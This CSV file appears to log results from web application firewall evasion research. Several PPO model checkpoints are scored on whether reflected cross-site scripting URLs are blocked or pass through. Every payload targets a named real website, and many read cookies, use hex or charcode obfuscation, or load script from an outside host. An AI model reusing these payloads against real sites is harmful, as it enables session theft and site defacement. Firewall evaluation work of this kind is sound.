status,label,executed,payload,family,base_i,name,algo,zip,target,lstm_success
200,BYPASS_NOEXEC,False,http://www.mundopt.com/user_detail.php?u=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://search.lycos.com/?query=%3c%2ftitle%3e%3cscript%3ealert%28%27xss%27%29%3b%3c%2fscript%3e,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://search.lycos.com/?query=%3c%2ftitle%3e%3cscript%3ealert%28%27xss%27%29%3b%3c%2fscript%3e,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://search.lycos.com/?query=%3c%2ftitle%3e%3cscript%3ealert%28%27xss%27%29%3b%3c%2fscript%3e,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.filebank.co.jp/cgi-bin/main/login_form.cgi?returl=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61<br<%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%<br 32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.filebank.co.jp/cgi-bin/main/login_form.cgi?returl=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61<br<%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%<br 32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.filebank.co.jp/cgi-bin/main/login_form.cgi?returl=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61<br<%6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%<br 32%2c%31%30%37%2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://customersupport.ea.com/loginapp/forgotscreenname.do?locale=%22%3e%3cscript%3ealert(/sh0ck/)%3<br<c/script%3e&amp;curl=aaaaaaa,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://customersupport.ea.com/loginapp/forgotscreenname.do?locale=%22%3e%3cscript%3ealert(/sh0ck/)%3<br<c/script%3e&amp;curl=aaaaaaa,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://customersupport.ea.com/loginapp/forgotscreenname.do?locale=%22%3e%3cscript%3ealert(/sh0ck/)%3<br<c/script%3e&amp;curl=aaaaaaa,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.vedanta.edu.in/page.php?id=14&amp;sid=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%<br<3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.vedanta.edu.in/page.php?id=14&amp;sid=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%<br<3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.vedanta.edu.in/page.php?id=14&amp;sid=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%<br<3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://whitepages.med.harvard.edu/whitepagespublic.asp?task=mysearch&amp;db=hms&amp;last_name=%22%3e%3cscrip<br<t%3ealert(%22go%20to%20stanford%22)%3c/script%3e%3cx,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://whitepages.med.harvard.edu/whitepagespublic.asp?task=mysearch&amp;db=hms&amp;last_name=%22%3e%3cscrip<br<t%3ealert(%22go%20to%20stanford%22)%3c/script%3e%3cx,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://whitepages.med.harvard.edu/whitepagespublic.asp?task=mysearch&amp;db=hms&amp;last_name=%22%3e%3cscrip<br<t%3ealert(%22go%20to%20stanford%22)%3c/script%3e%3cx,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,"ttp://www.europcarug.com/cgi-bin/feedback.cgi?lang=""><script><script><script><script><script><script><script><script>alert(document.cookie)</script>",transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,"ttp://www.europcarug.com/cgi-bin/feedback.cgi?lang=""><script><script><script><script><script><script><script><script>alert(document.cookie)</script>",transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,"ttp://www.europcarug.com/cgi-bin/feedback.cgi?lang=""><script><script><script><script><script><script><script><script>alert(document.cookie)</script>",transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.hotelash.co.nz/gallery/folderview.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;m<br<arquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.hotelash.co.nz/gallery/folderview.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;m<br<arquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.hotelash.co.nz/gallery/folderview.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;m<br<arquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,transfer,,,ppo,ppo_seed42.zip,app,False
0,ERROR,False,http://sourceforge.net/softwaremap/trove_list.php?form_cat=18&amp;form_cat=18&amp;stquery=%3c%22%3c%3cscript<br<%3ealert%28document.cookie%29%3c%2fscript%3e%3c%22%3c%3cscript%3ealert%28document.cookie,transfer,,,ppo,ppo_seed42.zip,pl1,False
0,ERROR,False,http://sourceforge.net/softwaremap/trove_list.php?form_cat=18&amp;form_cat=18&amp;stquery=%3c%22%3c%3cscript<br<%3ealert%28document.cookie%29%3c%2fscript%3e%3c%22%3c%3cscript%3ealert%28document.cookie,transfer,,,ppo,ppo_seed42.zip,pl2,False
0,ERROR,False,http://sourceforge.net/softwaremap/trove_list.php?form_cat=18&amp;form_cat=18&amp;stquery=%3c%22%3c%3cscript<br<%3ealert%28document.cookie%29%3c%2fscript%3e%3c%22%3c%3cscript%3ealert%28document.cookie,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://support.gomposerz.ch/index.php?&lt;script%20language=&quot;javascript&quot;%20src=&quot;http://kabustr.com/chat<br</c.js&quot;%20type=&quot;text/javascript&quot;&gt;kabus-kabustr.com-kabus-kabustr.com&lt;/script&gt;&lt;script&gt;alert(document.c<br ookie);&lt;/script&gt;&lt;script&gt;alert(/k,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://support.gomposerz.ch/index.php?&lt;script%20language=&quot;javascript&quot;%20src=&quot;http://kabustr.com/chat<br</c.js&quot;%20type=&quot;text/javascript&quot;&gt;kabus-kabustr.com-kabus-kabustr.com&lt;/script&gt;&lt;script&gt;alert(document.c<br ookie);&lt;/script&gt;&lt;script&gt;alert(/k,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://support.gomposerz.ch/index.php?&lt;script%20language=&quot;javascript&quot;%20src=&quot;http://kabustr.com/chat<br</c.js&quot;%20type=&quot;text/javascript&quot;&gt;kabus-kabustr.com-kabus-kabustr.com&lt;/script&gt;&lt;script&gt;alert(document.c<br ookie);&lt;/script&gt;&lt;script&gt;alert(/k,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://customer.tochka.ru/zpublic/information?src=stream_registration&amp;form_name=step1&amp;action=go&amp;phon<br<e=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylito<br l%3c/h1%3e%3c/marquee%3e,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://customer.tochka.ru/zpublic/information?src=stream_registration&amp;form_name=step1&amp;action=go&amp;phon<br<e=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylito<br l%3c/h1%3e%3c/marquee%3e,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://customer.tochka.ru/zpublic/information?src=stream_registration&amp;form_name=step1&amp;action=go&amp;phon<br<e=%27%22%3e%3c/title%3e%3cscript%3ealert(1337)%3c/script%3e%3e%3cmarquee%3e%3ch1%3exss%20by%20xylito<br l%3c/h1%3e%3c/marquee%3e,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://ir.timewarner.com/releases.cfm?ptype=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://ir.timewarner.com/releases.cfm?ptype=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://ir.timewarner.com/releases.cfm?ptype=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.netlingo.com/lookup.cfm?term=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.netlingo.com/lookup.cfm?term=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.netlingo.com/lookup.cfm?term=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.microsoft.com/windowsmobile/en-my/searchresults.mspx?st=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/script%3e%20:%20%20xss%20vulnerable,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.microsoft.com/windowsmobile/en-my/searchresults.mspx?st=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/script%3e%20:%20%20xss%20vulnerable,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.microsoft.com/windowsmobile/en-my/searchresults.mspx?st=%22%3e%3cscript%3ealert%28/ar3sw0rmed/%29;%3c/script%3e%20:%20%20xss%20vulnerable,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.erodatematch.nl/a.cfm?a=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.erodatematch.nl/a.cfm?a=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.erodatematch.nl/a.cfm?a=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://icscotland.icnetwork.co.uk/search.cfm?query=%22%3e%3cscript%3ealert(/xss%20-%20thedefaced.org<br</)%3c/script%3e%3cp,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://icscotland.icnetwork.co.uk/search.cfm?query=%22%3e%3cscript%3ealert(/xss%20-%20thedefaced.org<br</)%3c/script%3e%3cp,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://icscotland.icnetwork.co.uk/search.cfm?query=%22%3e%3cscript%3ealert(/xss%20-%20thedefaced.org<br</)%3c/script%3e%3cp,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.turkishdailynews.com.tr/apdetailspage.php?id=&quot;&gt;&lt;script&gt;alert('trex')&lt;/script&gt;&lt;h1&gt;hacked%2<br<0by%20trex/h1&gt;,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.turkishdailynews.com.tr/apdetailspage.php?id=&quot;&gt;&lt;script&gt;alert('trex')&lt;/script&gt;&lt;h1&gt;hacked%2<br<0by%20trex/h1&gt;,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.turkishdailynews.com.tr/apdetailspage.php?id=&quot;&gt;&lt;script&gt;alert('trex')&lt;/script&gt;&lt;h1&gt;hacked%2<br<0by%20trex/h1&gt;,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.betechseals.dk/irj/portal/anonymous?guest_user=&gt;&lt;script&gt;alert(&quot;818&quot;)&lt;/script&gt;&gt;&lt;script&gt;ale<br<rt(&quot;818&quot;)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.betechseals.dk/irj/portal/anonymous?guest_user=&gt;&lt;script&gt;alert(&quot;818&quot;)&lt;/script&gt;&gt;&lt;script&gt;ale<br<rt(&quot;818&quot;)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.betechseals.dk/irj/portal/anonymous?guest_user=&gt;&lt;script&gt;alert(&quot;818&quot;)&lt;/script&gt;&gt;&lt;script&gt;ale<br<rt(&quot;818&quot;)&lt;/script&gt;,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://z0ne-h.net/oyla.asp?haber_id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;h1&gt;by st@rext&lt;/h1&gt;,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://z0ne-h.net/oyla.asp?haber_id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;h1&gt;by st@rext&lt;/h1&gt;,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://z0ne-h.net/oyla.asp?haber_id=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&lt;h1&gt;by st@rext&lt;/h1&gt;,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://www.pizzahut.com/search/default.asp?qu=&gt;&gt;&lt;script&gt;alert(&quot;xss-arham+muhammad&quot;)&lt;/script&gt;&amp;action=<br<search,transfer,,,ppo,ppo_seed42.zip,pl1,False
403,BLOCK,False,http://www.pizzahut.com/search/default.asp?qu=&gt;&gt;&lt;script&gt;alert(&quot;xss-arham+muhammad&quot;)&lt;/script&gt;&amp;action=<br<search,transfer,,,ppo,ppo_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.pizzahut.com/search/default.asp?qu=&gt;&gt;&lt;script&gt;alert(&quot;xss-arham+muhammad&quot;)&lt;/script&gt;&amp;action=<br<search,transfer,,,ppo,ppo_seed42.zip,app,False
403,BLOCK,False,http://demo.shopy.biz/sr.asp?text=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,transfer,,,ppo,ppo_oracle_seed42.zip,pl1,False
403,BLOCK,False,http://demo.shopy.biz/sr.asp?text=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,transfer,,,ppo,ppo_oracle_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://demo.shopy.biz/sr.asp?text=&quot;&gt;&lt;script&gt;alert(&quot;backdoor&quot;)&lt;/script&gt;,transfer,,,ppo,ppo_oracle_seed42.zip,app,False
403,BLOCK,False,https://registration.ft.com/registration/subscription-service/register?pspurl='&gt;&lt;script&gt;alert('xss')<br>&lt;/script&gt;&lt;meta content=',transfer,,,ppo,ppo_oracle_seed42.zip,pl1,False
403,BLOCK,False,https://registration.ft.com/registration/subscription-service/register?pspurl='&gt;&lt;script&gt;alert('xss')<br>&lt;/script&gt;&lt;meta content=',transfer,,,ppo,ppo_oracle_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,https://registration.ft.com/registration/subscription-service/register?pspurl='&gt;&lt;script&gt;alert('xss')<br>&lt;/script&gt;&lt;meta content=',transfer,,,ppo,ppo_oracle_seed42.zip,app,False
403,BLOCK,False,http://www5.info-mapping.com/onpage/kuronekoyamato/pub/addrsrch2.asp?prfcd=37&amp;ctycd=202&amp;ctynm=%8a%db<br>%8bt%8es%22%3e'%3e%3cscript%3ealert('x')%3c/script%3e,transfer,,,ppo,ppo_oracle_seed42.zip,pl1,False
403,BLOCK,False,http://www5.info-mapping.com/onpage/kuronekoyamato/pub/addrsrch2.asp?prfcd=37&amp;ctycd=202&amp;ctynm=%8a%db<br>%8bt%8es%22%3e'%3e%3cscript%3ealert('x')%3c/script%3e,transfer,,,ppo,ppo_oracle_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www5.info-mapping.com/onpage/kuronekoyamato/pub/addrsrch2.asp?prfcd=37&amp;ctycd=202&amp;ctynm=%8a%db<br>%8bt%8es%22%3e'%3e%3cscript%3ealert('x')%3c/script%3e,transfer,,,ppo,ppo_oracle_seed42.zip,app,False
403,BLOCK,False,http://www.alldatasheet.co.kr/view.jsp?searchword=%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,transfer,,,ppo,ppo_oracle_seed42.zip,pl1,False
403,BLOCK,False,http://www.alldatasheet.co.kr/view.jsp?searchword=%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,transfer,,,ppo,ppo_oracle_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.alldatasheet.co.kr/view.jsp?searchword=%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,transfer,,,ppo,ppo_oracle_seed42.zip,app,False
403,BLOCK,False,http://hsv.auburnyoungalum.org/photos/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,transfer,,,ppo,ppo_oracle_seed42.zip,pl1,False
403,BLOCK,False,http://hsv.auburnyoungalum.org/photos/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,transfer,,,ppo,ppo_oracle_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://hsv.auburnyoungalum.org/photos/igallery.asp?d=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marq<br>uee&gt;&lt;h1&gt;by%20narcoticxs&lt;/h1&gt;&lt;/marquee&gt;,transfer,,,ppo,ppo_oracle_seed42.zip,app,False
403,BLOCK,False,http://dentalturkiye.net/scripts/kayit.asp?id=3558&amp;dil=tr&amp;page=grup.asp&amp;results=&quot;&gt;&lt;script&gt;alert(docu<br>ment.cookie)&lt;/script&gt;,transfer,,,ppo,ppo_oracle_seed42.zip,pl1,False
403,BLOCK,False,http://dentalturkiye.net/scripts/kayit.asp?id=3558&amp;dil=tr&amp;page=grup.asp&amp;results=&quot;&gt;&lt;script&gt;alert(docu<br>ment.cookie)&lt;/script&gt;,transfer,,,ppo,ppo_oracle_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://dentalturkiye.net/scripts/kayit.asp?id=3558&amp;dil=tr&amp;page=grup.asp&amp;results=&quot;&gt;&lt;script&gt;alert(docu<br>ment.cookie)&lt;/script&gt;,transfer,,,ppo,ppo_oracle_seed42.zip,app,False
403,BLOCK,False,http://ms161.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,transfer,,,ppo,ppo_oracle_seed42.zip,pl1,False
403,BLOCK,False,http://ms161.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,transfer,,,ppo,ppo_oracle_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://ms161.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,transfer,,,ppo,ppo_oracle_seed42.zip,app,False
403,BLOCK,False,http://www.hbly.gov.cn/search/searchcontroller?searchword=%ba%fe%b1%b1%27%22%3e%3c/title%3e%3cscript<br>%3ealert(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,transfer,,,ppo,ppo_oracle_seed42.zip,pl1,False
403,BLOCK,False,http://www.hbly.gov.cn/search/searchcontroller?searchword=%ba%fe%b1%b1%27%22%3e%3c/title%3e%3cscript<br>%3ealert(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,transfer,,,ppo,ppo_oracle_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.hbly.gov.cn/search/searchcontroller?searchword=%ba%fe%b1%b1%27%22%3e%3c/title%3e%3cscript<br>%3ealert(1337)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e,transfer,,,ppo,ppo_oracle_seed42.zip,app,False
403,BLOCK,False,http://www.istanbulsaglik.gov.tr/w/rehber/alfabetik_arama.asp?harf=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;<br>/script&gt;,transfer,,,ppo,ppo_oracle_seed42.zip,pl1,False
403,BLOCK,False,http://www.istanbulsaglik.gov.tr/w/rehber/alfabetik_arama.asp?harf=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;<br>/script&gt;,transfer,,,ppo,ppo_oracle_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.istanbulsaglik.gov.tr/w/rehber/alfabetik_arama.asp?harf=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;<br>/script&gt;,transfer,,,ppo,ppo_oracle_seed42.zip,app,False
403,BLOCK,False,http://c2ch.net/orz/orz.cgi/z4377n/wwwww.2ch.net/f1/%22%3e'%3e'%3c%22'%3e%22%3e'%3e%3cscript%3ealert<br>(%22xss%20by%20kusomiso.com%22)%3c/script%3e,transfer,,,ppo,ppo_oracle_seed42.zip,pl1,False
403,BLOCK,False,http://c2ch.net/orz/orz.cgi/z4377n/wwwww.2ch.net/f1/%22%3e'%3e'%3c%22'%3e%22%3e'%3e%3cscript%3ealert<br>(%22xss%20by%20kusomiso.com%22)%3c/script%3e,transfer,,,ppo,ppo_oracle_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://c2ch.net/orz/orz.cgi/z4377n/wwwww.2ch.net/f1/%22%3e'%3e'%3c%22'%3e%22%3e'%3e%3cscript%3ealert<br>(%22xss%20by%20kusomiso.com%22)%3c/script%3e,transfer,,,ppo,ppo_oracle_seed42.zip,app,False
403,BLOCK,False,http://www.aspcodecms.com/demo/wwwroot/default.asp?sec=64&amp;ma1=tag&amp;tag=%22%3e%3cscript%3ealert(docume<br>nt.cookie)%3c/script%3e%3cmarquee%3e%3ch1%3exss%20by%20xados%3ch1%3e%3c/marquee%3e,transfer,,,ppo,ppo_oracle_seed42.zip,pl1,False
403,BLOCK,False,http://www.aspcodecms.com/demo/wwwroot/default.asp?sec=64&amp;ma1=tag&amp;tag=%22%3e%3cscript%3ealert(docume<br>nt.cookie)%3c/script%3e%3cmarquee%3e%3ch1%3exss%20by%20xados%3ch1%3e%3c/marquee%3e,transfer,,,ppo,ppo_oracle_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.aspcodecms.com/demo/wwwroot/default.asp?sec=64&amp;ma1=tag&amp;tag=%22%3e%3cscript%3ealert(docume<br>nt.cookie)%3c/script%3e%3cmarquee%3e%3ch1%3exss%20by%20xados%3ch1%3e%3c/marquee%3e,transfer,,,ppo,ppo_oracle_seed42.zip,app,False
403,BLOCK,False,http://www.everpower.org/includes/phpthumb.php?originalimagedata=%3cscript%3ealert(document.cookie);<br>%3c/script%3e,transfer,,,ppo,ppo_oracle_seed42.zip,pl1,False
403,BLOCK,False,http://www.everpower.org/includes/phpthumb.php?originalimagedata=%3cscript%3ealert(document.cookie);<br>%3c/script%3e,transfer,,,ppo,ppo_oracle_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.everpower.org/includes/phpthumb.php?originalimagedata=%3cscript%3ealert(document.cookie);<br>%3c/script%3e,transfer,,,ppo,ppo_oracle_seed42.zip,app,False
403,BLOCK,False,http://www.gametrailers.com/screwattack.php?s=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28<br>%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%<br>2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36,transfer,,,ppo,ppo_oracle_seed42.zip,pl1,False
403,BLOCK,False,http://www.gametrailers.com/screwattack.php?s=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28<br>%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%<br>2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36,transfer,,,ppo,ppo_oracle_seed42.zip,pl2,False
200,BYPASS_NOEXEC,False,http://www.gametrailers.com/screwattack.php?s=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28<br>%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%<br>2c%31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36,transfer,,,ppo,ppo_oracle_seed42.zip,app,False
403,BLOCK,False,http://www.mcli.dist.maricopa.edu/mlx/empty.php?item=2102%22%3e%3cscript%3ealert(1337)%3c/script%3e%<br>22%3e%3cscript%3ealert(%22xss%20by%20\nxylitol%3c/h1%3e%3c/marquee%3e,transfer,,,ppo,ppo_oracle_seed42.zip,pl1,False
403,BLOCK,False,http://www.mcli.dist.maricopa.edu/mlx/empty.php?item=2102%22%3e%3cscript%3ealert(1337)%3c/script%3e%<br>22%3e%3cscript%3ealert(%22xss%20by%20\nxylitol%3c/h1%3e%3c/marquee%3e,transfer,,,ppo,ppo_oracle_seed42.zip,pl2,False
